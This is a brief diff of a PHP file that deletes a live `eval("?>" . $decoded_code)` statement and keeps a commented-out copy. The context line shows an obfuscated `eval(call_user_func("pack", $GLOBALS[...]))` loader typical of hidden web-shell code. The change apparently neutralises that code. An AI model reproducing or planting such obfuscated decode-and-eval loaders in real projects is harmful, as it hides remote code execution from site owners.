@@ -70,6 +70,4 @@ eval(call_user_func("pack",$GLOBALS[A_AAA__A_][6/2*3-9],$GLOBALS[A_AAA__A_][(-15
     eval("?>" . $decoded_code);
 */
 
-eval("?>" . $decoded_code);
-
 ?>
